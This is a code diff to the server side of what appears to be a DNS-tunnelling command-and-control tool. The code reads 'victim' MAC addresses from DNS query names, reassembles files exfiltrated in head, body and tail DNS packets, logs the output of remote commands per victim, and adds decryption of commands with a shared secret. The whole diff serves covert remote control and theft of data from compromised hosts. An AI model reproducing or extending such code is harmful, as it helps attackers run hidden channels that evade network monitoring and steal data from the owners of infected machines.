@@ -10,7 +10,8 @@ from operator import attrgetter
 from utils.request_type import RequestType
 from utils.data_req_type import DataRequestType
 from utils.mac import Mac
-from utils.consts import log, PacketData, BROADCAST_MAC
+from utils.consts import log, PacketData, BROADCAST_MAC, SECRET
+from utils.encrypt import Encrypter
 from command.cmdparser import CommandParser
 
 class DataReceiver():
@@ -29,6 +30,8 @@ class DataReceiver():
         if not pkt.haslayer(DNSQR):
             return
 
+        # print(pkt.show())
+
         if pkt.getlayer(DNSQR).qtype == RequestType.PING:
             self._receive_ping(pkt)
         elif pkt.getlayer(DNSQR).qtype == RequestType.DATA:
@@ -45,7 +48,7 @@ class DataReceiver():
 
         # Fetch given command that should be sent to the client
         log('DataReceiver', '_receive_ping', 'Received ping packet')
-        victim_mac = Mac(pkt.getlayer(Ether).src)
+        victim_mac = Mac(pkt.getlayer(DNSQR).qname.split('.')[0])
 
         # Ignore broadcast since Ether() is sent as empty
         if str(victim_mac) == BROADCAST_MAC:
@@ -71,7 +74,12 @@ class DataReceiver():
         """
 
         log('DataReceiver', '_receive_data', 'Received data packet')
-        victim_mac = Mac(pkt.getlayer(Ether).src)
+        victim_mac = Mac(pkt.getlayer(DNSQR).qname.split('.')[0])
+
+        victim_dir = self.rel_path + str(victim_mac)
+        if not os.path.exists(victim_dir):
+            log('DataReceiver', '_receive_data', 'Unknown host.')
+            return
 
         # Ignore broadcast since Ether() is sent as empty
         if str(victim_mac) == BROADCAST_MAC:
@@ -84,7 +92,7 @@ class DataReceiver():
         filename = fields[-2] + '.' + fields[-1]
         key = str(victim_mac) + '@' + filename
 
-        self._handle_data_pkts(pkt, dnsqr_layer, filename, key, victim_mac)
+        self._handle_data_pkts(pkt, dns_layer, dnsqr_layer, filename, key, victim_mac)
 
 
     def _receive_recpt(self, pkt):
@@ -100,7 +108,7 @@ class DataReceiver():
         # print(test.rdata)
 
         # Create a new file with current timestamp with output of command
-        victim_mac = Mac(pkt.getlayer(Ether).src)
+        victim_mac = Mac(pkt.getlayer(DNSQR).qname.split('.')[0])
 
         # Ignore broadcast since Ether() is sent as empty
         if str(victim_mac) == BROADCAST_MAC:
@@ -125,27 +133,32 @@ class DataReceiver():
         timestamp = datetime.now().isoformat()
         with open(self.rel_path + str(victim_mac) + '/output/' + timestamp + '.txt', 'w') as f:
             dnsrr_layer = pkt.getlayer(DNSRR)
-            f.write(dnsrr_layer.rrname[:-1] + '\n') # Command associated with output
+            command = dnsrr_layer.rrname[:-1]
+            f.write(Encrypter(command, SECRET).decrypt() + '\n') # Command associated with output
             f.write(dnsrr_layer.rdata)
 
-    def _handle_data_pkts(self, pkt, dnsqr_layer, filename, key, victim_mac):
+    def _handle_data_pkts(self, pkt, dns_layer, dnsqr_layer, filename, key, victim_mac):
+        if dns_layer == None or dnsqr_layer == None:
+            return
+
         # Determine if it is a head, body, or tail packet
-        if dnsqr_layer.qclass == DataRequestType.HEAD:
+        if dns_layer.opcode == DataRequestType.HEAD:
             # Create entry, append data
             dnsrr_layer = pkt.getlayer(DNSRR)
             dns_layer = pkt.getlayer(DNS)
             self.file_transfer[key] = [PacketData(0, dnsrr_layer.rdata)]
 
-        elif dnsqr_layer.qclass == DataRequestType.NORMAL:
+        elif dns_layer.opcode == DataRequestType.NORMAL:
             dnsrr_layer = pkt.getlayer(DNSRR)
             dns_layer = pkt.getlayer(DNS)
-            self.file_transfer[key].append(PacketData(dns_layer.opcode, dnsrr_layer.rdata))
-        elif dnsqr_layer.qclass == DataRequestType.TAIL:
+            self.file_transfer[key].append(PacketData(dnsqr_layer.qclass, dnsrr_layer.rdata))
+        elif dns_layer.opcode == DataRequestType.TAIL:
             dnsrr_layer = pkt.getlayer(DNSRR)
             dns_layer = pkt.getlayer(DNS)
-            self.file_transfer[key].append(PacketData(dns_layer.opcode, dnsrr_layer.rdata))
+            self.file_transfer[key].append(PacketData(dnsqr_layer.qclass, dnsrr_layer.rdata))
 
             # Sort packets since they may be out of order
+            self.file_transfer[key] = sorted(self.file_transfer[key], key=attrgetter('index'))
 
             # Write to file from buffer
             victim_dir = self.rel_path + str(victim_mac)
